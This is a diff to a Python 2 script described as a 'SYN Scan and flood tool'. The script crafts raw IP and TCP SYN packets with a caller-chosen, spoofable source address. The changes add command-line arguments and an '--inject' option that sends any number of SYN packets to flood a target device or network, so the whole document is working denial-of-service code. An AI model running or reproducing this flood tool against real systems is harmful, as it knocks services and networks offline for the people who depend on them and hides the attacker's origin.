@@ -9,10 +9,6 @@ import argparse
 # Global list to store the error messages
 error_msg = []
 
-def usage():
-	if(sys.argv <= 3):
-		print 'Not enough arguments'
-
 def createSock(s):
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
@@ -31,7 +27,7 @@ def checksum(msg):
 	s = ~s & 0xffff
 	return s
 
-# IP address is given in as function parameter/argument
+# IPV4 Packet creation 
 def ipCreate(source_ip, dest_ip):
 	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
@@ -57,13 +53,8 @@ def ipCreate(source_ip, dest_ip):
 	ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
 	return ip_header
 
-# Once the header is packed and the function returns it. ip header is created
-#ip_header = ipCreate('127.0.0.1', '127.0.0.1')
-
-# SYN Packet is created from the function containing the flags
+# TCP SYN Packet created using the function which is then fed to pack function, to pack in network bits
 def tcpCreate(source_ip ,dest_ip, source_port, dest_port):
-#	source_ip = '10.0.2.7'
-#	dest_ip = '10.0.2.12'
 	seq = 0
 	ack_seq = 0
 	doff = 5
@@ -106,46 +97,32 @@ def tcpCreate(source_ip ,dest_ip, source_port, dest_port):
 	tcp_checksum = checksum(psh)
 
 	tcp_header = pack('!HHLLBBHHH', source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_ptr)
-
 	return tcp_header
 
 def main():
 	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 	createSock(s)
-#	usage()
-#	source_ip = (str(sys.argv[1]))
-#	dest_ip = (str(sys.argv[2]))
-##	source_port = (int(sys.argv[3]))
-#	dest_port = (int(sys.argv[4]))
-	parser = argparse.ArgumentParser(description='SYN Scan and flood tool')
-        parser.add_argument("-s", "--source-ip", help='Source IP Address to form packet', type=str, required=True)
-        parser.add_argument("-d", "--dest-ip", help='Destination IP address to form packet', type=str, required=True)
-
+	parser = argparse.ArgumentParser(description='SYN Scan and flood tool which forms raw packets taking required IP addresses and port numbers')
+        parser.add_argument("sip", help='Source IP Address to form packet', type=str)
+        parser.add_argument("dip", help='Destination IP address to form packet', type=str)
+	parser.add_argument("sport", help='Source port to form packet', type=int)
+	parser.add_argument("dport", help='Destination port to form packet', type=int)
+	parser.add_argument("-i", "--inject", help="SYN Flood option to send arbituary number of packets to flood device or network", type=int)
         args = parser.parse_args()
-	ip_header = ipCreate(args.source-ip, args.dest-ip)
-	#ip_header = ipCreate(source_ip, dest_ip)
-	#tcp_header = tcpCreate(source_ip, dest_ip, source_port, dest_port)
-	packet = ip_header + tcp_header
-	# Attempt to check if data has actually been sent - s.sendto(packet, ('source_ip' << THIS DETERMINES SUCCESS), 0 ))
-#	result = s.sendto(packet, (dest_ip, 0))
 
-	# Include optional argument
-	choice = raw_input("Would you like to cause a flood of packets? ")
-	decision = str(choice)
-	if(choice == 'y'):
+	ip_header = ipCreate(args.sip, args.dip)
+	tcp_header = tcpCreate(args.sip, args.dip, args.sport, args.dport)
+	packet = ip_header + tcp_header
+	if args.inject:
 		i = 0
-		counter = raw_input("Enter the number of packets to flood with: ")
-		value = int(counter)
+		value = int(args.inject)
 		while i < value:
 			i += 1
-			print ('Your number is {}'.format(i))
-			result = s.sendto(packet, (dest_ip, 0))
-	elif(choice == 'n'):
-		print ('Sending one packet then')
-		result = s.sendto(packet, (dest_ip, 0))
+			print("Packets sent: {}".format(i))
+			result = s.sendto(packet, (args.dip, 0))
 	else:
-		print ("I didn't catch that")
-		sys.exit(1)
-	print ('Packet size is {}'.format(result))
+		print("Inject option was not chosen, sending 1 packet...")
+		result = s.sendto(packet, (args.dip, 0))
+
 	# TO TEST THIS PROGRAM LAUNCH IN PYTHON AND OPEN WIRESHARK ON THE SPECIFIED NETWORK INTERFACE
 main()
